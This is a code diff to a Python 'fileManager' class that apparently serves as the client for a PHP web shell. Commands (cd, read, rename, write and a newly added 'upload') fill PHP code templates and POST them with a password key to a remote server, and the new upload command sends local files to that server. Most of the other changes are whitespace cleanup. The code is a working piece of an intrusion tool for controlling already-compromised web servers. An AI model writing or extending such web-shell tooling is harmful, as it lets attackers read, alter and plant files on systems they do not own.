@@ -43,7 +43,7 @@ class fileManager:
         str = self.CHANGE_PATH[0]
         while j!=self.i:
             j = j + 1
-            str = str + '/' + self.CHANGE_PATH[j]  
+            str = str + '/' + self.CHANGE_PATH[j]
         return fileC.PHP_CHDIR.replace('##',str,1)
 
     def FileMain(self,re):
@@ -59,7 +59,7 @@ class fileManager:
                 print('exit')
                 flag == ''
                 break
-                
+
             if flag[0] == 'cd':
                 if self.check(flag)>1:
                     if flag[1] != '.' and flag[1] != '..':
@@ -77,7 +77,7 @@ class fileManager:
 
                 else:
                     continue
-                
+
             if flag[0] == 'read':
                 if self.check(flag)>1:
                     READ_r = fileC.PHP_READ.replace('##',flag[1],1)
@@ -151,7 +151,7 @@ class fileManager:
                 date = { self.key : pwd }
                 commit = re.post(self.connect,date)
                 print(commit.text,"\n")
-                
+
             if flag[0] == 'rename':
                 if self.check(flag)>2:
                     rename = fileC.PHP_RENAME.replace('#1',flag[1],1)
@@ -177,9 +177,23 @@ class fileManager:
             if flag[0] == 'write':
                 if self.check(flag)>2:
                     write = fileC.PHP_WRITE.replace('#1',flag[1],1)
-                    write = write.replace("#2",flag[2])
+                    write = write.replace("#2",flag[2],1)
                     write = write.replace('@@',self.changePath(),1)
                     date = { self.key : write }
+                    commit = re.post(self.connect,date)
+                    print(commit.text,"\n")
+                else:
+                    continue
+
+            if flag[0] == 'upload':
+                if self.check(flag)>2:
+                    update = fileC.PHP_UPLOAD.replace('#1',flag[1],1)
+                    #将本地路径所指文件读出到strofupdate
+                    file1 = open(flag[2])
+                    strofupdate = file1.read()
+                    update = update.replace('#2',strofupdate,1)
+                    update = update.replace('@@',self.changePath(),1)
+                    date = { self.key : update }
                     commit = re.post(self.connect,date)
                     print(commit.text,"\n")
                 else:
